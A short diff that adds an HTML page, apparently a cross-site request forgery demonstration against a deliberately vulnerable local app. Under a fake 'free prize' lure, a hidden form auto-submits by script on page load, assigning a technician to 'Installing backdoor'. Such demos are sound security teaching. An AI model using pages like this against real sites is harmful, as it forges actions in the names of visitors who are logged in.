@@ -1,0 +1,13 @@
+<html>
+<body>
+<h1>Click here for free prize!</h1>
+<form id="csrf" method="POST" 
+      action="http://localhost:8000/vulnerable/assign/15/">
+    <input type="hidden" name="technician_name" 
+           value="Hacker McHackface">
+    <input type="hidden" name="action" 
+           value="Installing backdoor">
+</form>
+<script>document.getElementById('csrf').submit();</script>
+</body>
+</html>
